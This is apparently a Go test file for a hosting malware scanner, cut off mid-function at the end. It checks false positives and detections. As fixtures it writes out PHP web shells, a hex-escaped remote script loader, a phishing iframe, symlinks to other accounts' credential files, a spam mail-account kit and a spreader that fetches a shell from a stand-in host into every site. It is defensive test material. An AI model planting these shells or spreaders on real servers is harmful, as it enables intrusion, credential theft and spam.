package scanner

import (
	"archive/zip"
	"bytes"
	"compress/flate"
	"context"
	"crypto/md5"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"syscall"
	"testing"
	"time"
)

// Every kind of file restored from quarantine after a fleet review is kept
// here, judged the way a scan of any server judges it (path and content),
// so a new or reinstalled server never quarantines them again and a later
// rule change cannot bring them back. Malware next to them must still be
// caught. Fixtures are minimal, inert shapes of the real files.
func TestFleetRestoredCategories(t *testing.T) {
	s := newScanner(t)
	cert := base64.StdEncoding.EncodeToString([]byte("-----BEGIN CERTIFICATE-----\n" +
		base64.StdEncoding.EncodeToString(bytes.Repeat([]byte{0x30, 0x82, 0x04, 0xa4}, 60)) + "\n-----END CERTIFICATE-----\n"))
	clean := []struct{ name, path, content string }{
		{"builder kit thumbnail saved as a page", "/home/u/public_html/wp-content/uploads/master_addons/templates_kits/thumbnails/image-Media.png",
			"<!DOCTYPE html><html><head><title>Just a moment...</title></head><body><script>window.location.href='/cdn-cgi/challenge'</script></body></html>"},
		{"cPanel MultiPHP ini", "/home/u/public_html/php.ini", "; cPanel-generated php ini directives, do not edit\n[PHP]\nauto_append_file = \"\"\nauto_prepend_file = \"\"\nmemory_limit = 1024M\n"},
		{"SureMails hardening ini", "/home/u/public_html/wp-content/uploads/suremails/.user.ini", "; Prevent auto-prepend/append attacks\nauto_prepend_file =\nauto_append_file =\n"},
		{"registration mail", "/home/u/shop.example.com/account/register.php", `<?php require_once '../config/db.php'; $email = trim($_POST['email'] ?? ''); @mail($email, 'Welcome - Verify Your Email', $body, 'From: '.ADMIN_EMAIL); header('Location: /account/dashboard.php');`},
		{"shipping app sign-up mail", "/home/u/public_html/application/ajax/sign_up_ajax.php", `<?php require_once("../loader.php"); $email_template = cdp_getEmailTemplates(7); $subject = $email_template->subject; mail($_POST['email'], $subject, $message, $header);`},
		{"composer ca-bundle", "/home/u/public_html/vendor/composer/ca-bundle/src/CaBundle.php", `<?php namespace Composer\CaBundle; class CaBundle { public static function isOpensslParseSafe() { $cert = '` + cert + `'; $script = "openssl_x509_parse(base64_decode('%s'));"; return $script; } }`},
		{"Laravel compiled view", "/home/u/app.example.com/storage/framework/views/4a985be53df3e16180696f04e944b6bb.php",
			`<?php $__componentOriginal8a3c0f9b5e2d4c7a1f6e9b0d3c5a7e2f = $component; ?><?php if (isset($__componentOriginal8a3c0f9b5e2d4c7a1f6e9b0d3c5a7e2f)): ?><?php $component = $__componentOriginal8a3c0f9b5e2d4c7a1f6e9b0d3c5a7e2f; ?><?php endif; ?><?php /**PATH /home/u/app/resources/views/welcome.blade.php ENDPATH**/ ?>`},
		{"analog stats cache", "/home/u/tmp/analog/cache", "CACHE type 5 produced by analog 6.0/Unix. Do not modify or delete!\nT\t0\t0\t460\n/wp-login.php?x=<?php eval($_POST[1]);?>\t1\n"},
	}
	for _, c := range clean {
		if d := s.checkContent(c.path, extOf(c.path), []byte(c.content)); d != nil {
			t.Errorf("%s: quarantined again as %s", c.name, d.Signature)
		}
	}
	elf := []byte{0x7f, 'E', 'L', 'F', 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0x3e, 0}
	for _, p := range []string{
		"/home/u/public_html/wp-content/ewww/optipng", "/home/u/site.example.com/wp-content/ewww/cwebp",
		"/home/u/public_html/news/app/ThirdParty/webp-convert/vendor/rosell-dk/webp-convert/src/Convert/Converters/Binaries/cwebp-120-linux-x86-64",
		"/home/u/public_html/node_modules/.bin/esbuild",
	} {
		if d, _ := binaryCheck(p, elf); d != nil {
			t.Errorf("%s: quarantined again as %s", p, d.Signature)
		}
	}

	// What must stay caught next to them.
	bad := []struct{ name, path, content string }{
		{"loader in ini", "/home/u/public_html/.user.ini", "auto_prepend_file = \"/home/u/public_html/wp-content/uploads/.x.ico\"\n"},
		{"open relay in a site", "/home/u/shop.example.com/admins/flyer.php", `<?php require 'common/conn.php'; $to = trim($_POST['frndemail']); $subject = $_POST["emailSubject"]; $ok = mail($to, $subject, $Body, "From: x"); header("Location: Newsletter.php");`},
		{"mail tester", "/home/u/public_html/.389653248945710.php", `<?php goto a; a: $to = $_GET["to"]; @mail($to, "Sending emails 1", "Test"); echo "##SENT##"; unlink(basename(__FILE__));`},
		{"page hidden as an upload image", "/home/u/public_html/wp-content/uploads/2026/10/logo.png", "<html><body><iframe src='https://phish.example/login'></iframe></body></html>"},
	}
	for _, c := range bad {
		if d := s.checkContent(c.path, extOf(c.path), []byte(c.content)); d == nil {
			t.Errorf("%s: no longer caught", c.name)
		}
	}
	if d, _ := binaryCheck("/home/u/site.example.com/wp-content/plugins/wp-rocket/vendor/monolog/monolog/src/Monolog/Handler/SyslogUdp/16e2277f8b31_A", elf); d == nil {
		t.Error("program hidden in a plugin's vendor folder: no longer caught")
	}
}

// Old embed codes write a script tag with document.write(unescape(...))
// (Google Analytics' ga.js loader, lead and chat widgets): only the
// brackets are escaped and the address is readable. A script or hidden
// frame spelled out in escaped letters is still reported.
func TestFleetDocumentWriteUnescape(t *testing.T) {
	ga := `var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));`
	if v := AnalyzeScript("js", []byte(ga)); v != nil {
		t.Errorf("ga.js loader reported as %s", v.Signature)
	}
	hidden := `document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%22%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%22%3E%3C%2F%73%63%72%69%70%74%3E'));`
	if v := AnalyzeScript("js", []byte(hidden)); v == nil {
		t.Error("escaped script not reported")
	}
}

// A published plugin's zip (WP-CLI's download cache on s5: the same
// WooCommerce PayPal Payments 4.1.3 zip quarantined 911 times in ten
// accounts) is judged like the installed plugin: members matching the
// version's official checksums are not reported. A changed member, a zip
// that is not one plugin, or a plugin without checksums is still checked.
func TestFleetPluginZipOfficialMembers(t *testing.T) {
	packed := []byte("<?php $d='" + strings.Repeat("QUFB", 600) + "';eval(base64_decode($d));")
	if d := analyze(".php", packed); d == nil || d.Category != CatVirus {
		t.Fatalf("fixture: %+v", d)
	}
	main := []byte("<?php\n/**\n * Plugin Name: Pay Example\n * Version: 4.1.3\n */\n")
	mk := func(name string, files map[string][]byte) string {
		p := filepath.Join(t.TempDir(), name)
		f, _ := os.Create(p)
		w := zip.NewWriter(f)
		for n, c := range files {
			e, _ := w.Create(n)
			e.Write(c)
		}
		w.Close()
		f.Close()
		return p
	}
	official := md5.Sum(packed)
	var asked []string
	known := func(slug, version, rel string, sum [16]byte) bool {
		asked = append(asked, slug+"@"+version+":"+rel)
		return slug == "pay-example" && version == "4.1.3" && rel == "build/loader.php" && sum == official
	}
	plugin := map[string][]byte{"pay-example/pay-example.php": main, "pay-example/build/loader.php": packed}
	z := mk("pay-example-4.1.3.zip", plugin)
	fi, _ := os.Stat(z)
	if d := scanZipKnown(z, fi.Size(), known); d != nil {
		t.Fatalf("official plugin zip reported: %s (asked %v)", d.Signature, asked)
	}
	// Without the checksums the same zip is reported.
	if d := scanZipKnown(z, fi.Size(), nil); d == nil {
		t.Fatal("zip not checked without checksums")
	}
	// A changed member.
	changed := append(append([]byte{}, packed...), ' ')
	z2 := mk("pay-example-4.1.3.zip", map[string][]byte{"pay-example/pay-example.php": main, "pay-example/build/loader.php": changed})
	fi, _ = os.Stat(z2)
	if d := scanZipKnown(z2, fi.Size(), known); d == nil {
		t.Fatal("changed member not reported")
	}
	// Not one plugin folder: a shell next to a copy of the official file.
	z3 := mk("pay-example-4.1.3.zip", map[string][]byte{"pay-example/pay-example.php": main, "pay-example/build/loader.php": packed, "x.php": changed})
	fi, _ = os.Stat(z3)
	if d := scanZipKnown(z3, fi.Size(), func(string, string, string, [16]byte) bool { return true }); d == nil {
		t.Fatal("mixed zip trusted")
	}
}

// A2 F6: files trusted by name, place and shape (Softaculous's login file,
// WordPress translation files) stay trusted, but not when they call
// something named at run time on request data, and never when their exact
// content is known malware. Fixtures call harmless functions (strtoupper):
// only the shape matters.
func TestFleetShapeTrustNeedsNoDynamicCall(t *testing.T) {
	s := newScanner(t)
	root := t.TempDir()
	os.WriteFile(filepath.Join(root, "wp-config.php"), []byte("<?php define('X', 1);"), 0o644)
	sapp := filepath.Join(root, "sapp-wp-signon.php")
	l10n := filepath.Join(root, "wp-content", "languages", "plugins", "demo-en_GB.l10n.php")
	os.MkdirAll(filepath.Dir(l10n), 0o755)
	l10nOK := "<?php\nreturn ['domain'=>'demo','messages'=>['Run (now)'=>'Run (now)','Save'=>'Save']];\n"
	for _, c := range []struct {
		path, content string
		trusted       bool
	}{
		{sapp, sappSignon, true},
		{sapp, sappSignon + "\n$cb = $_REQUEST['cb']; $cb('x');", false},
		{sapp, sappSignon + "\n$a = array($_REQUEST['cb']); $a[0]('x');", false},
		{sapp, sappSignon + "\n('str'.'toupper')(getenv('HTTP_X'));", false},
		{sapp, sappSignon + "\narray_map($_REQUEST['cb'], array('x'));", false},
	} {
		if got := trustedHostingTool(c.path, []byte(c.content)); got != c.trusted {
			t.Errorf("login file %q: trusted %v, want %v", c.content[len(c.content)-30:], got, c.trusted)
		}
	}
	for _, c := range []struct {
		content string
		trusted bool
	}{
		{l10nOK, true},
		{"<?php\nreturn ['domain'=>('str'.'toupper')(getenv('HTTP_X'))];\n", false},
		{"<?php\nreturn ['domain'=>array_map('str'.'toupper', ['x'])];\n", false},
		{"<?php\nreturn ['domain'=>$GLOBALS['cb']('x')];\n", false},
		{"<?php\nreturn ['domain'=>file_get_contents('php://input')];\n", false},
	} {
		if got := translationFile(l10n, []byte(c.content)); got != c.trusted {
			t.Errorf("translation %q: trusted %v, want %v", c.content, got, c.trusted)
		}
	}

	// Known-bad content under a trusted shape is still caught by its hash.
	os.WriteFile(sapp, []byte(sappSignon), 0o644)
	info, _ := os.Lstat(sapp)
	if d, err := s.CheckFile(sapp, info, s.Settings.Get().Scanner); d != nil || err == nil {
		t.Fatalf("login file not trusted: %v %v", d, err)
	}
	sum := sha256.Sum256([]byte(sappSignon))
	os.MkdirAll(filepath.Dir(HashDBPath()), 0o700)
	os.WriteFile(HashDBPath(), []byte(fmt.Sprintf("%d %s XG-TEST.KnownBad\n", len(sappSignon), hex.EncodeToString(sum[:]))), 0o600)
	ReloadHashDB()
	t.Cleanup(func() { os.Remove(HashDBPath()); ReloadHashDB() })
	if d, _ := s.CheckFile(sapp, info, s.Settings.Get().Scanner); d == nil || d.Signature != "XG-TEST.KnownBad" {
		t.Fatalf("known-bad hash skipped for a trusted shape: %v", d)
	}
}

// A credential theft kit (server1, business300, server100: folders of
// links named <account>-WordPress-public_html.txt, one to every account's
// wp-config.php, .env and .accesshash) was only reported, so the links
// stayed readable. A link to another account's files is removed whenever
// malware is quarantined, also a dangling one waiting for a secret file to
// appear; the targets are never touched, and Restore makes the link again.
// Links inside the account itself or to public files stay.
func TestFleetSymlinkTheftKit(t *testing.T) {
	if os.Geteuid() != 0 {
		t.Skip("needs root to own files as other accounts")
	}
	s := newScanner(t)
	if _, err := s.Settings.Patch([]byte(`{"scanner":{"virus_action":"quarantine"}}`)); err != nil {
		t.Fatal(err)
	}
	base := t.TempDir()
	thief, victim := filepath.Join(base, "thief"), filepath.Join(base, "victim")
	const thiefUID, victimUID = 65533, 65532
	for _, d := range []string{filepath.Join(thief, "public_html", "kit"), filepath.Join(victim, "public_html")} {
		os.MkdirAll(d, 0o755)
	}
	secret := filepath.Join(victim, "public_html", "wp-config.php")
	os.WriteFile(secret, []byte("<?php // inert fixture: define('DB_PASSWORD', 'x');"), 0o640)
	own := filepath.Join(thief, "public_html", "index.php")
	os.WriteFile(own, []byte("<?php echo 1;"), 0o644)
	filepath.Walk(victim, func(p string, _ os.FileInfo, _ error) error { return os.Lchown(p, victimUID, victimUID) })
	homes := map[uint32]string{thiefUID: thief, victimUID: victim}
	kit := filepath.Join(thief, "public_html", "kit")
	links := map[string]string{
		"victim-WordPress-public_html.txt": secret,                                    // live
		"victim-cpanel.txt":                filepath.Join(victim, ".accesshash"),      // dangling secret
		"victim-env.txt":                   filepath.Join(victim, "public_html/.env"), // dangling secret
	}
	for name, target := range links {
		p := filepath.Join(kit, name)
		os.Symlink(target, p)
		os.Lchown(p, thiefUID, thiefUID)
	}
	keep := map[string]string{
		"own.txt":     own,                                           // the account's own file
		"missing.txt": filepath.Join(victim, "public_html/logo.png"), // dangling, not a secret
	}
	for name, target := range keep {
		p := filepath.Join(kit, name)
		os.Symlink(target, p)
		os.Lchown(p, thiefUID, thiefUID)
	}
	for name := range keep {
		if _, bad := InsecureSymlink(filepath.Join(kit, name), homes); bad {
			t.Errorf("%s: flagged", name)
		}
	}
	var ids []int64
	for name, target := range links {
		p := filepath.Join(kit, name)
		got, bad := InsecureSymlink(p, homes)
		if !bad || got != target {
			t.Fatalf("%s: not flagged (%q %v)", name, got, bad)
		}
		info, _ := os.Lstat(p)
		f, err := s.Record(0, "manual", p, info, Detection{CatSymlink, "Symlink.OtherAccount -> " + got})
		if err != nil || f.Status != "quarantined" {
			t.Fatalf("%s: %+v %v", name, f, err)
		}
		if _, err := os.Lstat(p); !os.IsNotExist(err) {
			t.Fatalf("%s: link still there", name)
		}
		ids = append(ids, f.ID)
	}
	if st, err := os.Stat(secret); err != nil || st.Mode().Perm() != 0o640 {
		t.Fatalf("target touched: %v %v", st, err)
	}
	if err := s.Restore(ids[0]); err != nil {
		t.Fatal(err)
	}
	f, _ := s.Get(ids[0])
	if back, err := os.Readlink(f.Path); err != nil || back != links[filepath.Base(f.Path)] {
		t.Fatalf("restore: %q %v", back, err)
	}
	if li, _ := os.Lstat(f.Path); li.Sys().(*syscall.Stat_t).Uid != thiefUID {
		t.Fatal("restored link lost its owner")
	}
	if err := s.Delete(ids[1]); err != nil {
		t.Fatalf("delete a removed link: %v", err)
	}
}

// A web shell padded past the size limit (server1's report: an 11 MB file
// is never read) is judged by its start and end; a big clean PHP file (a
// generated translation array) stays clean.
func TestFleetPaddedBigPHP(t *testing.T) {
	s := newScanner(t)
	cfg := s.Settings.Get().Scanner
	limit := int64(cfg.MaxFileSizeMB) << 20
	dir := t.TempDir()
	pad := strings.Repeat("/* lorem ipsum dolor sit amet */\n", int(limit/33)+1000)
	bad := filepath.Join(dir, "cache-handler.php")
	os.WriteFile(bad, []byte(pad+"<?php @eval($_POST['a']); ?>\n"), 0o644)
	var b strings.Builder
	b.WriteString("<?php\nreturn array(\n")
	for i := 0; int64(b.Len()) <= limit+(1<<20); i++ {
		fmt.Fprintf(&b, "  'string_%d' => 'Translated text number %d',\n", i, i)
	}
	b.WriteString(");\n")
	clean := filepath.Join(dir, "lang-ur.php")
	os.WriteFile(clean, []byte(b.String()), 0o644)
	for path, want := range map[string]bool{bad: true, clean: false} {
		info, _ := os.Stat(path)
		if info.Size() <= limit {
			t.Fatalf("%s: fixture not over the limit", path)
		}
		d, err := s.CheckFile(path, info, cfg)
		if (d != nil) != want {
			t.Errorf("%s: detection %+v (%v), want %v", filepath.Base(path), d, err, want)
		}
	}
}

// System links reported as "Symlink.OtherAccount" on business500,
// business600 and server1: cPanel's /home/user -> /home2/user and CageFS's
// skeleton (owned by root), ~/logs/<domain>.bkup -> the domlog cPanel keeps
// as root:<account> 0640, and npm's node_modules/.bin links to files
// unpacked with another uid inside the account's own home. None lets the
// account read anything it could not read already. A kit link to another
// account's wp-config.php is still flagged.
func TestFleetSystemSymlinks(t *testing.T) {
	if os.Geteuid() != 0 {
		t.Skip("needs root to own files as other accounts")
	}
	const userUID, otherUID = 65531, 65530
	base := t.TempDir()
	os.Chmod(base, 0o755)
	user, other := filepath.Join(base, "home", "user"), filepath.Join(base, "home2", "other")
	logs := filepath.Join(base, "domlogs")
	for _, d := range []string{filepath.Join(user, "logs"), filepath.Join(user, "nodevenv", "node_modules", ".bin"), filepath.Join(user, "nodevenv", "node_modules", "esbuild", "bin"),
		filepath.Join(other, "public_html"), logs, filepath.Join(base, "home")} {
		os.MkdirAll(d, 0o755)
	}
	os.Lchown(user, userUID, userUID)
	os.Lchown(other, otherUID, otherUID)
	write := func(p string, mode os.FileMode, uid, gid int) {
		os.WriteFile(p, []byte("inert fixture"), mode)
		os.Chmod(p, mode)
		os.Lchown(p, uid, gid)
	}
	domlog := filepath.Join(logs, "example.com.bkup")
	write(domlog, 0o640, 0, userUID)
	tool := filepath.Join(user, "nodevenv", "node_modules", "esbuild", "bin", "esbuild")
	write(tool, 0o750, 1001, 1001)
	secret := filepath.Join(other, "public_html", "wp-config.php")
	write(secret, 0o640, otherUID, otherUID)
	homes := map[uint32]string{userUID: user, otherUID: other}
	link := func(target, p string, uid int) string {
		os.Symlink(target, p)
		os.Lchown(p, uid, uid)
		return p
	}
	clean := map[string]string{
		"cPanel /home link":  link(other, filepath.Join(base, "home", "other"), 0),
		"domlog backup link": link(domlog, filepath.Join(user, "logs", "example.com.bkup"), userUID),
		"npm .bin link":      link(tool, filepath.Join(user, "nodevenv", "node_modules", ".bin", "esbuild"), userUID),
	}
	for name, p := range clean {
		if got, bad := InsecureSymlink(p, homes); bad {
			t.Errorf("%s flagged (-> %s)", name, got)
		}
	}
	kit := link(secret, filepath.Join(user, "other-WordPress-public_html.txt"), userUID)
	if got, bad := InsecureSymlink(kit, homes); !bad || got != secret {
		t.Fatalf("kit link to another account's wp-config.php not flagged: %q %v", got, bad)
	}
	// Someone else's file the account cannot read (not its group) is still flagged.
	private := filepath.Join(logs, "private.log")
	write(private, 0o640, 0, otherUID)
	if _, bad := InsecureSymlink(link(private, filepath.Join(user, "logs", "private.log"), userUID), homes); !bad {
		t.Fatal("link to an unreadable file of another group not flagged")
	}
	// Findings reported before are closed when the agent starts; the kit's
	// stays open.
	s := newScanner(t)
	ids := map[string]int64{}
	for name, p := range map[string]string{"system": clean["cPanel /home link"], "domlog": clean["domlog backup link"], "kit": kit} {
		res, err := s.DB.Exec(`INSERT INTO findings (scan_id, source, path, owner, category, signature, sha256, size, status, created_at, updated_at) VALUES (1,'manual',?,'u','symlink','Symlink.OtherAccount','',10,'detected',1,1)`, p)
		if err != nil {
			t.Fatal(err)
		}
		ids[name], _ = res.LastInsertId()
	}
	if n, err := s.CloseSafeLinks(); err != nil || n != 2 {
		t.Fatalf("closed %d (%v), want 2", n, err)
	}
	for name, want := range map[string]string{"system": "cleared", "domlog": "cleared", "kit": "detected"} {
		if f, _ := s.Get(ids[name]); f.Status != want {
			t.Errorf("%s: status %q, want %q", name, f.Status, want)
		}
	}
}

// Malware run by cron from ~/.cache/.<hex> (business500: baezonco,
// dndsnatu) was only caught by a learned hash: the scan skipped ~/.cache.
// Its own files are checked now; package caches below it stay skipped.
func TestFleetHomeCacheLoader(t *testing.T) {
	s := newScanner(t)
	root := writeTree(t, map[string]string{
		".cache/.6c06cf44589da250b74db94f6909955535088504a": malicious["eval.php"],
		".cache/composer/files/vendor/pkg/x.php":            malicious["eval.php"],
		"public_html/index.php":                             "<?php echo 'hello';",
	})
	// A scan of the account, and a full scan (the home is one of the roots).
	for _, roots := range [][]string{{root}, {root, t.TempDir()}} {
		var hits []string
		_, err := s.scanTree(context.Background(), roots, time.Time{}, 0, s.Settings.Get().Scanner, treeHooks{
			hit: func(path string, _ fs.FileInfo, _ Detection) { hits = append(hits, path) },
		})
		if err != nil {
			t.Fatal(err)
		}
		if len(hits) != 1 || !strings.HasSuffix(hits[0], "/.cache/.6c06cf44589da250b74db94f6909955535088504a") {
			t.Fatalf("roots %v: hits %v, want only the loader in ~/.cache", roots, hits)
		}
	}
}

// The kit writes a site's .htaccess back over and over (business500
// masfosur: 784 times). Each return is cleaned in place: the site keeps
// its WordPress rules instead of losing the file each time.
func TestFleetReturnedRootHtaccessCleaned(t *testing.T) {
	s := newScanner(t)
	if _, err := s.Settings.Patch([]byte(`{"scanner":{"virus_action":"quarantine"}}`)); err != nil {
		t.Fatal(err)
	}
	site := filepath.Join(t.TempDir(), "public_html")
	os.MkdirAll(site, 0o755)
	os.WriteFile(filepath.Join(site, "wp-config.php"), []byte("<?php // inert fixture"), 0o640)
	hacked := "<FilesMatch '.(py|exe|php|PHP|Php|suspected)$'>\nOrder allow,deny\nDeny from all\n</FilesMatch>\n" +
		"<FilesMatch '^(index.php|wp-login.php|adminfuns.php)$'>\nOrder allow,deny\nAllow from all\n</FilesMatch>\n" +
		"<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . index.php [L]\n</IfModule>\n"
	ht := filepath.Join(site, ".htaccess")
	os.WriteFile(ht, []byte(hacked), 0o644)
	info, _ := os.Lstat(ht)
	d := htaccessHack([]byte(hacked))
	if d == nil {
		t.Fatal("fixture not detected")
	}
	// The state on the server: the first copy quarantined, the cleaning
	// lost the race with the kit's next write.
	sum := sha256File(ht)
	if _, err := s.DB.Exec(`INSERT INTO findings (scan_id, source, path, owner, category, signature, sha256, size, status, created_at, updated_at) VALUES (0,'realtime',?,'u','virus',?,?,?,'quarantined',1,1)`,
		ht, d.Signature, sum, info.Size()); err != nil {
		t.Fatal(err)
	}
	f, err := s.Record(0, "realtime", ht, info, *d)
	if err != nil || f.Status != "quarantined" || f.Repeats != 1 {
		t.Fatalf("%+v %v", f, err)
	}
	got, err := os.ReadFile(ht)
	if err != nil {
		t.Fatal("site's .htaccess removed")
	}
	if htaccessHack(got) != nil || !strings.Contains(string(got), "RewriteRule . index.php [L]") {
		t.Fatalf("not cleaned: %q", got)
	}
	// Elsewhere a returned file is still removed.
	other := filepath.Join(site, "wp-content", "uploads", ".htaccess")
	os.MkdirAll(filepath.Dir(other), 0o755)
	os.WriteFile(other, []byte(hacked), 0o644)
	oi, _ := os.Lstat(other)
	s.DB.Exec(`INSERT INTO findings (scan_id, source, path, owner, category, signature, sha256, size, status, created_at, updated_at) VALUES (0,'realtime',?,'u','virus',?,?,?,'quarantined',1,1)`,
		other, d.Signature, sum, oi.Size())
	if _, err := s.Record(0, "realtime", other, oi, *d); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Lstat(other); err == nil {
		t.Fatal("returned lock in uploads not removed")
	}
}

// buildPhar writes a phar in PHP's format (uncompressed members).
func buildPhar(stub string, files map[string]string) []byte {
	var man, data bytes.Buffer
	u32 := func(b *bytes.Buffer, v int) { b.Write([]byte{byte(v), byte(v >> 8), byte(v >> 16), byte(v >> 24)}) }
	u32(&man, len(files))
	man.Write([]byte{0x11, 0x00}) // API 1.1.0
	u32(&man, 0x10000)            // has a signature
	u32(&man, 0)                  // alias
	u32(&man, 0)                  // metadata
	names := make([]string, 0, len(files))
	for n := range files {
		names = append(names, n)
	}
	sort.Strings(names)
	for _, n := range names {
		u32(&man, len(n))
		man.WriteString(n)
		u32(&man, len(files[n]))
		u32(&man, 1792800000)
		u32(&man, len(files[n]))
		u32(&man, 0)
		u32(&man, 0o644)
		u32(&man, 0)
		data.WriteString(files[n])
	}
	var out bytes.Buffer
	out.WriteString(stub + "__HALT_COMPILER(); ?>\r\n")
	u32(&out, man.Len())
	out.Write(man.Bytes())
	out.Write(data.Bytes())
	out.Write(bytes.Repeat([]byte{0xab}, 20))
	out.Write([]byte{2, 0, 0, 0})
	out.WriteString("GBMB")
	return out.Bytes()
}

// composer.phar (the official 2.8.12, in aroojacademy's home on server100)
// and wp-cli.phar were "PHP.Obfuscated.HaltCompilerPayload": the
// libraries' own eval after __HALT_COMPILER, judged as one file. A phar is
// judged by its stub and each script in it now; a web shell inside one, or
// in its stub, is still caught, and a file that only looks like a phar is
// judged as before.
func TestFleetPharByMembers(t *testing.T) {
	s := newScanner(t)
	stub := "#!/usr/bin/env php\n<?php\nPhar::mapPhar('tool.phar');\nrequire 'phar://tool.phar/bin/tool';\n"
	lib := map[string]string{
		"bin/tool":                 "<?php\nrequire __DIR__ . '/../src/App.php';\n(new App())->run();\n",
		"src/App.php":              "<?php\nclass App { public function run() { echo 'inert fixture'; } }\n",
		"vendor/twig/Template.php": "<?php\n// a template engine compiles templates to PHP\nfunction render(string $compiled) { return eval('?>' . $compiled); }\n",
	}
	check := func(name string, content []byte) *Detection {
		t.Helper()
		p := filepath.Join(t.TempDir(), name)
		os.WriteFile(p, content, 0o644)
		info, _ := os.Lstat(p)
		d, err := s.CheckFile(p, info, s.Settings.Get().Scanner)
		if err != nil && err != ErrTrusted {
			t.Fatal(err)
		}
		return d
	}
	clean := buildPhar(stub, lib)
	if old := analyze(".phar", clean); old == nil || old.Signature != "PHP.Obfuscated.HaltCompilerPayload" {
		t.Fatalf("fixture does not reproduce the old false positive: %+v", old)
	}
	if d := check("composer.phar", clean); d != nil {
		t.Fatalf("clean phar flagged: %+v", d)
	}
	shell := map[string]string{"src/App.php": lib["src/App.php"], "src/x.php": "<?php @eval($_POST['a']); ?>"}
	if d := check("tool.phar", buildPhar(stub, shell)); d == nil || d.Category != CatVirus || !strings.HasPrefix(d.Signature, "Archive.") {
		t.Fatalf("web shell inside a phar: %+v", d)
	}
	if d := check("tool.phar", buildPhar("<?php @eval($_POST['a']); ?>\n<?php ", lib)); d == nil || d.Category != CatVirus {
		t.Fatalf("web shell in the stub: %+v", d)
	}
	broken := append([]byte(stub+"__HALT_COMPILER(); ?>\n"), []byte("\xff\xff\xff\x7f garbage eval($x)")...)
	if d := check("tool.phar", broken); d == nil {
		t.Fatal("not a phar: no longer judged as a whole")
	}
}

// escapeAll writes a string as PHP hex escapes, as kits hide their strings.
func escapeAll(s string) string {
	var b strings.Builder
	for i := 0; i < len(s); i++ {
		fmt.Fprintf(&b, "\\x%02x", s[i])
	}
	return b.String()
}

// A kit in a hex-named file in uploads (a sample from another product's
// quarantine, 2026-10-24) that the rules missed: goto-flattened, every
// string escaped, no eval and no decoder. It creates mail accounts for
// spam in every domain (~/etc/<domain>/shadow and the mailbox folders) and
// copies shells fetched from a web address into every site, and starts
// with an HTML comment, so as a file without an extension it was not
// even read as PHP. Inert fixtures of both behaviours; a mail plugin that
// only talks about mailboxes, and a script reading the system's
// /etc/shadow, are not flagged.
func TestFleetMassMailKit(t *testing.T) {
	s := newScanner(t)
	mailKit := "<!-- https://t.me/example -->\r\n<?php\n goto a1; a2: $p = \"" + escapeAll("/home/u/etc/") + "{$d}" + escapeAll("/shadow") + "\"; goto a3; a1: $d = \"" + escapeAll("example.test") + "\"; goto a2;\n" +
		" a3: @mkdir(\"" + escapeAll("/home/u/mail/") + "{$d}" + escapeAll("/info/cur") + "\", 0755, true); file_put_contents($p, \"" + escapeAll("info:x:inert") + "\", FILE_APPEND); file_put_contents(\"" + escapeAll("/home/u/mail/") + "{$d}" + escapeAll("/info/dovecot-uidlist") + "\", \"\");\n"
	spreader := "<?php\n goto b1; b1: $u = \"" + escapeAll("https://example.invalid/kit/shell.txt") + "\"; $c = file_get_contents($u); goto b2;\n" +
		" b2: foreach (glob(\"" + escapeAll("/home/*/public_html") + "\") as $r) { if (is_dir($r)) { file_put_contents($r . \"" + escapeAll("/wp-content/x.php") + "\", $c); } }\n"
	check := func(name, content string) *Detection {
		t.Helper()
		p := filepath.Join(t.TempDir(), "public_html", "wp-content", "uploads", name)
		os.MkdirAll(filepath.Dir(p), 0o755)
		os.WriteFile(p, []byte(content), 0o644)
		info, _ := os.Lstat(p)
		d, err := s.CheckFile(p, info, s.Settings.Get().Scanner)
		if err != nil && err != ErrTrusted {
			t.Fatal(err)
		}
		return d
	}
	if d := check("2c97f8049bc68e5b23793559ecd6025c", mailKit); d == nil || d.Signature != "PHP.Spam.MailAccountCreator" || d.Category != CatVirus {
		t.Fatalf("mail account kit without an extension: %+v", d)
	}
	if d := check("x.php", spreader); d == nil || d.Signature != "PHP.Dropper.RemoteSpreader" {
		t.Fatalf("remote shell spreader: %+v", d)
	}
	clean := map[string]string{
		"webmail-help.php": "<?php\n// Shows the account's mailboxes (dovecot keeps them in ~/mail/<domain>/<user>/cur).\n$log = __DIR__ . '/mailbox.log';\nfile_put_contents($log, date('c') . \" listed\\n\", FILE_APPEND);\necho 'Mail is delivered to /home/u/mail/example.test/info/new';\n",
		"server-check.php": "<?php\n$ok = is_readable('/etc/shadow') ? 'readable' : 'protected';\nfile_put_contents(__DIR__ . '/check.txt', $ok);\necho 'dovecot status checked';\n",
	}
	for name, content := range clean {
		if d := check(name, content); d != nil {
			t.Errorf("%s flagged: %+v", name, d)
		}
	}
}

// business200 (2026-10-26): one name (worksec.php) copied into 42
// WordPress core folders of a site, with no finding: each copy's content
// passed the content rules. WordPress keeps no PHP in its css and images
// folders; a copy there with copies in other core folders is a dropper,
// one alone is suspicious. Core's own PHP (wp-includes/fonts since 6.5,
// wp-admin/includes) and other folders called so stay alone.
func TestFleetPlantedInWordPressCore(t *testing.T) {
	s := newScanner(t)
	root := filepath.Join(t.TempDir(), "u", "public_html")
	put := func(rel, body string) {
		os.MkdirAll(filepath.Join(root, filepath.Dir(rel)), 0o755)
		os.WriteFile(filepath.Join(root, rel), []byte(body), 0o644)
	}
	put("wp-includes/version.php", "<?php $wp_version = '7.1.3';")
	inert := "<?php /* inert test fixture */ echo 'x';"
	for _, d := range []string{"wp-admin/css", "wp-admin/images", "wp-includes/css", "wp-includes/ID3", "wp-includes/IXR", "wp-includes/Text"} {
		put(d+"/worksec.php", inert)
	}
	put("wp-includes/images/lonely.php", inert)
	put("wp-includes/fonts/class-wp-font-face.php", "<?php class WP_Font_Face {}")
	put("wp-admin/includes/custom-helper.php", inert)
	check := func(rel string) *Detection {
		return s.checkContent(filepath.Join(root, rel), ".php", []byte(inert))
	}
